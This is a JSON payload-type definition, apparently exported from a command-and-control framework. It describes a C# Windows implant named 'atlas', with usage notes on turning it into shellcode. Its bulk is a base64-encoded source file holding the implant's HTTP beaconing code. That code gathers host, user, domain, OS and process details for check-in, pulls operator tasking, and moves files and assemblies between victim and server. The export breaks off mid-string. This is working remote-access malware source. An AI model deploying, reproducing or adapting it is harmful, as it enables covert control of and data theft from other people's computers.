{
  "payload_types": [
    {
      "wrapper": false,
      "command_template": "\n",
      "supported_os": "Windows (x86),Windows (x64)",
      "execute_help": "Run as a normal executable on Windows or use the donut project to turn into shellcode: https:\/\/github.com\/TheWover\/donut",
      "external": false,
      "container_running": true,
      "service": "rabbitmq",
      "author": "@Airzero24",
      "note": "This payload uses C# to target Windows hosts with the .NET framework installed. For more information and a more detailed README, check out: https:\/\/github.com\/airzero24\/Atlas",
      "supports_dynamic_loading": false,
      "deleted": false,
      "last_heartbeat": "04\/06\/2020 04:14:25",
      "ptype": "atlas",
      "file_extension": "cs",
      "wrapped_payload_type": "null",
      "icon": null,
      "files": [
        {
          "Http_3.5.cs": "77u\/dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLk5ldDsNCnVzaW5nIFN5c3RlbS5MaW5xOw0KI2lmIERFRkFVTFQNCnVzaW5nIFN5c3RlbS5UZXh0Ow0KI2VuZGlmDQp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7DQp1c2luZyBNaWNyb3NvZnQuV2luMzI7DQoNCm5hbWVzcGFjZSBBdGxhcw0Kew0KICAgIHB1YmxpYyBjbGFzcyBIdHRwDQogICAgew0KICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgQ2hlY2tJbigpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KI2lmIERFRkFVTFRfRUtFDQogICAgICAgICAgICAgICAgQ3J5cHRvLkdlblJzYUtleXMoKTsNCiAgICAgICAgICAgICAgICBVdGlscy5HZXRTdGFnZSBHZXRTdGFnZSA9IG5ldyBVdGlscy5HZXRTdGFnZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gInN0YWdpbmdfcnNhIiwNCiAgICAgICAgICAgICAgICAgICAgcHViX2tleSA9IENyeXB0by5HZXRQdWJLZXkoKSwNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbl9pZCA9IFV0aWxzLkdldFNlc3Npb25JZCgpDQoNCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgIENvbmZpZy5TZXNzaW9uSWQgPSBHZXRTdGFnZS5zZXNzaW9uX2lkOw0KICAgICAgICAgICAgICAgIHN0cmluZyBTZXJpYWxpemVkRGF0YSA9IENyeXB0by5FbmNyeXB0U3RhZ2UoVXRpbHMuR2V0U3RhZ2UuVG9Kc29uKEdldFN0YWdlKSk7DQogICAgICAgICAgICAgICAgdmFyIHJlc3VsdCA9IEdldChTZXJpYWxpemVkRGF0YSk7DQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IENyeXB0by5EZWNyeXB0KHJlc3VsdCk7DQogICAgICAgICAgICAgICAgVXRpbHMuU3RhZ2VSZXNwb25zZSBTdGFnZVJlc3BvbnNlID0gVXRpbHMuU3RhZ2VSZXNwb25zZS5Gcm9tSnNvbihmaW5hbF9yZXN1bHQpOw0KICAgICAgICAgICAgICAgIENvbmZpZy50ZW1wVVVJRCA9IFN0YWdlUmVzcG9uc2UudXVpZDsNCiAgICAgICAgICAgICAgICBDb25maWcuUHNrID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhDcnlwdG8uUnNhRGVjcnlwdChDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoU3RhZ2VSZXNwb25zZS5zZXNzaW9uX2tleSkpKTsNCiNlbmRpZg0KICAgICAgICAgICAgICAgIFV0aWxzLkNoZWNrSW4gQ2hlY2tJbiA9IG5ldyBVdGlscy5DaGVja0luDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSAiY2hlY2tpbiIsDQogICAgICAgICAgICAgICAgICAgIGlwID0gVXRpbHMuR2V0SVBBZGRyZXNzKCksDQogICAgICAgICAgICAgICAgICAgIG9zID0gUmVnaXN0cnkuR2V0VmFsdWUoQCJIS0VZX0xPQ0FMX01BQ0hJTkVcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb24iLCAiUHJvZHVjdE5hbWUiLCAiIikuVG9TdHJpbmcoKSArICIgIiArIFJlZ2lzdHJ5LkdldFZhbHVlKEAiSEtFWV9MT0NBTF9NQUNISU5FXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uIiwgIlJlbGVhc2VJZCIsICIiKSwNCiAgICAgICAgICAgICAgICAgICAgdXNlciA9IEVudmlyb25tZW50LlVzZXJOYW1lLlRvU3RyaW5nKCksDQogICAgICAgICAgICAgICAgICAgIGhvc3QgPSBFbnZpcm9ubWVudC5NYWNoaW5lTmFtZS5Ub1N0cmluZygpLA0KICAgICAgICAgICAgICAgICAgICBkb21haW4gPSBFbnZpcm9ubWVudC5Vc2VyRG9tYWluTmFtZS5Ub1N0cmluZygpLA0KICAgICAgICAgICAgICAgICAgICBwaWQgPSBQcm9jZXNzLkdldEN1cnJlbnRQcm9jZXNzKCkuSWQsDQogICAgICAgICAgICAgICAgICAgIHV1aWQgPSBDb25maWcuUGF5bG9hZFVVSUQsDQogICAgICAgICAgICAgICAgICAgIGFyY2hpdGVjdHVyZSA9IFV0aWxzLkdldEFyY2goKQ0KICAgICAgICAgICAgICAgIH07DQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIHN0cmluZyBGaW5hbFNlcmlhbGl6ZWREYXRhID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhFbmNvZGluZy5VVEY4LkdldEJ5dGVzKENvbmZpZy5QYXlsb2FkVVVJRCArIFV0aWxzLkNoZWNrSW4uVG9Kc29uKENoZWNrSW4pKSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIEZpbmFsU2VyaWFsaXplZERhdGEgPSBDcnlwdG8uRW5jcnlwdENoZWNraW4oVXRpbHMuQ2hlY2tJbi5Ub0pzb24oQ2hlY2tJbikpOw0KI2VuZGlmDQogICAgICAgICAgICAgICAgdmFyIG5ld19yZXN1bHQgPSBHZXQoRmluYWxTZXJpYWxpemVkRGF0YSk7DQojaWYgKERFRkFVTFRfUFNLIHx8IERFRkFVTFRfRUtFKQ0KICAgICAgICAgICAgICAgIHN0cmluZyBsYXN0X3Jlc3VsdCA9IENyeXB0by5EZWNyeXB0KG5ld19yZXN1bHQpOw0KI2VuZGlmDQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIFV0aWxzLkNoZWNrSW5SZXNwb25zZSBDaGVja0luUmVzcG9uc2UgPSBVdGlscy5DaGVja0luUmVzcG9uc2UuRnJvbUpzb24obmV3X3Jlc3VsdCk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgVXRpbHMuQ2hlY2tJblJlc3BvbnNlIENoZWNrSW5SZXNwb25zZSA9IFV0aWxzLkNoZWNrSW5SZXNwb25zZS5Gcm9tSnNvbihsYXN0X3Jlc3VsdCk7DQojZW5kaWYNCiAgICAgICAgICAgICAgICBDb25maWcuVVVJRCA9IENoZWNrSW5SZXNwb25zZS5pZDsNCiAgICAgICAgICAgICAgICBpZiAoQ2hlY2tJblJlc3BvbnNlLnN0YXR1cyA9PSAic3VjY2VzcyIpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIEdldFRhc2tpbmcoVXRpbHMuSm9iTGlzdCBKb2JMaXN0KQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JlYWNoIChVdGlscy5Kb2IgSm9iIGluIEpvYkxpc3Quam9icykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmIChKb2IudXBsb2FkKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKEpvYi50b3RhbF9jaHVua3MgIT0gSm9iLmNodW5rX251bSkgJiAoSm9iLnRvdGFsX2NodW5rcyAhPSAwKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIUpvYi5jaHVua2luZ19zdGFydGVkKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVXBsb2FkVGFza2luZyBVcGxvYWRUYXNraW5nID0gVXRpbHMuVXBsb2FkVGFza2luZy5Gcm9tSnNvbihKb2IucGFyYW1ldGVycyk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5maWxlX2lkID0gVXBsb2FkVGFza2luZy5hc3NlbWJseV9pZDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnBhdGggPSBVcGxvYWRUYXNraW5nLnJlbW90ZV9wYXRoOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5VcGxvYWQgVXBsb2FkID0gbmV3IFV0aWxzLlVwbG9hZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSAidXBsb2FkIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX3NpemUgPSBDb25maWcuQ2h1bmtTaXplLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IEpvYi5maWxlX2lkLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gSm9iLmNodW5rX251bSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IEpvYi5wYXRoLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IEpvYi50YXNrX2lkDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlVwbG9hZFJlc3BvbnNlIFVwbG9hZFJlc3BvbnNlID0gSHR0cC5HZXRVcGxvYWQoVXBsb2FkKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnRvdGFsX2NodW5rcyA9IFVwbG9hZFJlc3BvbnNlLnRvdGFsX2NodW5rczsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rcy5BZGQoVXBsb2FkUmVzcG9uc2UuY2h1bmtfZGF0YSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua2luZ19zdGFydGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rX251bSsrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5VcGxvYWQgQ2h1bmtVcGxvYWQgPSBuZXcgVXRpbHMuVXBsb2FkDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFjdGlvbiA9ICJ1cGxvYWQiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfc2l6ZSA9IENvbmZpZy5DaHVua1NpemUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gSm9iLmZpbGVfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSBKb2IuY2h1bmtfbnVtLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gSm9iLnBhdGgsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVXBsb2FkUmVzcG9uc2UgVXBsb2FkUmVzcG9uc2UgPSBIdHRwLkdldFVwbG9hZChDaHVua1VwbG9hZCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua3MuQWRkKFVwbG9hZFJlc3BvbnNlLmNodW5rX2RhdGEpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBVdGlscy5HZXRUYXNraW5nIEdldFRhc2tpbmcgPSBuZXcgVXRpbHMuR2V0VGFza2luZw0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gImdldF90YXNraW5nIiwNCiAgICAgICAgICAgICAgICAgICAgdGFza2luZ19zaXplID0gMQ0KICAgICAgICAgICAgICAgIH07DQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIHN0cmluZyBTZXJpYWxpemVkRGF0YSA9IENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhDb25maWcuVVVJRCArIFV0aWxzLkdldFRhc2tpbmcuVG9Kc29uKEdldFRhc2tpbmcpKSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIFNlcmlhbGl6ZWREYXRhID0gQ3J5cHRvLkVuY3J5cHQoVXRpbHMuR2V0VGFza2luZy5Ub0pzb24oR2V0VGFza2luZykpOw0KI2VuZGlmDQogICAgICAgICAgICAgICAgdmFyIHJlc3VsdCA9IEdldChTZXJpYWxpemVkRGF0YSk7DQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIHN0cmluZyBmaW5hbF9yZXN1bHQgPSBFbmNvZGluZy5VVEY4LkdldFN0cmluZyhDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcocmVzdWx0KSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IENyeXB0by5EZWNyeXB0KHJlc3VsdCk7DQojZW5kaWYNCiAgICAgICAgICAgICAgICBpZiAoZmluYWxfcmVzdWx0LlN1YnN0cmluZygwLCAzNikgIT0gQ29uZmlnLlVVSUQpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIFV0aWxzLkdldFRhc2tpbmdSZXNwb25zZSBHZXRUYXNrUmVzcG9uc2UgPSBVdGlscy5HZXRUYXNraW5nUmVzcG9uc2UuRnJvbUpzb24oZmluYWxfcmVzdWx0LlN1YnN0cmluZygzNikpOw0KICAgICAgICAgICAgICAgIGlmIChHZXRUYXNrUmVzcG9uc2UudGFza3NbMF0uY29tbWFuZCA9PSAiIikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZm9yZWFjaCAoVXRpbHMuVGFzayB0YXNrIGluIEdldFRhc2tSZXNwb25zZS50YXNrcykgew0KICAgICAgICAgICAgICAgICAgICBVdGlscy5Kb2IgSm9iID0gbmV3IFV0aWxzLkpvYg0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBqb2JfaWQgPSBKb2JMaXN0LmpvYl9jb3VudCwNCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSB0YXNrLmlkLA0KICAgICAgICAgICAgICAgICAgICAgICAgY29tcGxldGVkID0gZmFsc2UsDQogICAgICAgICAgICAgICAgICAgICAgICBqb2Jfc3RhcnRlZCA9IGZhbHNlLA0KICAgICAgICAgICAgICAgICAgICAgICAgc3VjY2VzcyA9IGZhbHNlLA0KICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IHRhc2suY29tbWFuZCwNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhcmFtZXRlcnMgPSB0YXNrLnBhcmFtZXRlcnMsDQogICAgICAgICAgICAgICAgICAgICAgICB0b3RhbF9jaHVua3MgPSAwDQogICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgIGlmIChKb2IuY29tbWFuZCA9PSAibG9hZGFzc2VtYmx5IiB8fCBKb2IuY29tbWFuZCA9PSAidXBsb2FkIikNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnVwbG9hZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IudG90YWxfY2h1bmtzID0gMjsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua19udW0gPSAxOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKEpvYi5jb21tYW5kID09ICJkb3dubG9hZCIpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5kb3dubG9hZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAoSm9iLmNvbW1hbmQgPT0gImpvYnMiKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSBNb2R1bGVzLkdldEpvYnMoSm9iTGlzdCk7DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlIGlmIChKb2IuY29tbWFuZCA9PSAiam9ia2lsbCIpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChNb2R1bGVzLktpbGxKb2IoSm9iTGlzdCwgSW50MzIuUGFyc2UoSm9iLnBhcmFtZXRlcnMpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnJlc3BvbnNlID0gIkpvYiBzdWNjZXNzZnVsbHkgcmVtb3ZlZCI7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNvbXBsZXRlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnN1Y2Nlc3MgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSAiQ291bGQgbm90IHJlbW92ZSBqb2IiOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIEpvYkxpc3Quam9icy5BZGQoSm9iKTsNCiAgICAgICAgICAgICAgICAgICAgKytKb2JMaXN0LmpvYl9jb3VudDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgVXRpbHMuVXBsb2FkUmVzcG9uc2UgR2V0VXBsb2FkKFV0aWxzLlVwbG9hZCBVcGxvYWQpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KI2lmIERFRkFVTFQNCiAgICAgICAgICAgICAgICBzdHJpbmcgU2VyaWFsaXplZERhdGEgPSBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKEVuY29kaW5nLlVURjguR2V0Qnl0ZXMoQ29uZmlnLlVVSUQgKyBVdGlscy5VcGxvYWQuVG9Kc29uKFVwbG9hZCkpKTsNCiNlbGlmIChERUZBVUxUX1BTSyB8fCBERUZBVUxUX0VLRSkNCiAgICAgICAgICAgICAgICBzdHJpbmcgU2VyaWFsaXplZERhdGEgPSBDcnlwdG8uRW5jcnlwdChVdGlscy5VcGxvYWQuVG9Kc29uKFVwbG9hZCkpOw0KI2VuZGlmDQogICAgICAgICAgICAgICAgdmFyIHJlc3VsdCA9IEdldChTZXJpYWxpemVkRGF0YSk7DQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIHN0cmluZyBmaW5hbF9yZXN1bHQgPSBFbmNvZGluZy5VVEY4LkdldFN0cmluZyhDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcocmVzdWx0KSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IENyeXB0by5EZWNyeXB0KHJlc3VsdCk7DQojZW5kaWYNCiAgICAgICAgICAgICAgICBVdGlscy5VcGxvYWRSZXNwb25zZSBVcGxvYWRSZXNwb25zZSA9IFV0aWxzLlVwbG9hZFJlc3BvbnNlLkZyb21Kc29uKGZpbmFsX3Jlc3VsdC5TdWJzdHJpbmcoMzYpKTsNCg0KICAgICAgICAgICAgICAgIHJldHVybiBVcGxvYWRSZXNwb25zZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgVXRpbHMuVXBsb2FkUmVzcG9uc2UgVXBsb2FkUmVzcG9uc2UgPSBuZXcgVXRpbHMuVXBsb2FkUmVzcG9uc2UgeyB9Ow0KICAgICAgICAgICAgICAgIHJldHVybiBVcGxvYWRSZXNwb25zZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYm9vbCBQb3N0UmVzcG9uc2UoVXRpbHMuSm9iTGlzdCBKb2JMaXN0KQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBVdGlscy5Qb3N0UmVzcG9uc2UgUG9zdFJlc3BvbnNlID0gbmV3IFV0aWxzLlBvc3RSZXNwb25zZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gInBvc3RfcmVzcG9uc2UiLA0KICAgICAgICAgICAgICAgICAgICByZXNwb25zZXMgPSB7IH0NCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKFV0aWxzLkpvYiBKb2IgaW4gSm9iTGlzdC5qb2JzKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKEpvYi5jb21wbGV0ZWQpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIUpvYi5zdWNjZXNzKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlRhc2tSZXNwb25zZSBUYXNrUmVzcG9uc2UgPSBuZXcgVXRpbHMuVGFza1Jlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfb3V0cHV0ID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gImVycm9yIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tcGxldGVkID0gImZhbHNlIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBKb2IucmVzcG9uc2UsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvdGFsX2NodW5rcyA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX251bSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX2RhdGEgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgUG9zdFJlc3BvbnNlLnJlc3BvbnNlcy5BZGQoVGFza1Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKEpvYi5kb3dubG9hZCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmZpbGVfaWQgPT0gbnVsbCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlRhc2tSZXNwb25zZSBUYXNrUmVzcG9uc2UgPSBuZXcgVXRpbHMuVGFza1Jlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBKb2IudGFza19pZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfb3V0cHV0ID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1cyA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gSm9iLnRvdGFsX2NodW5rcywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IEpvYi5wYXRoLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX2RhdGEgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUG9zdFJlc3BvbnNlLnJlc3BvbnNlcy5BZGQoVGFza1Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAoSm9iLmNodW5rX251bSA9PSBKb2IudG90YWxfY2h1bmtzKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVGFza1Jlc3BvbnNlIFRhc2tSZXNwb25zZSA9IG5ldyBVdGlscy5UYXNrUmVzcG9uc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IEpvYi50YXNrX2lkLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcl9vdXRwdXQgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbXBsZXRlZCA9ICJ0cnVlIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvdGFsX2NodW5rcyA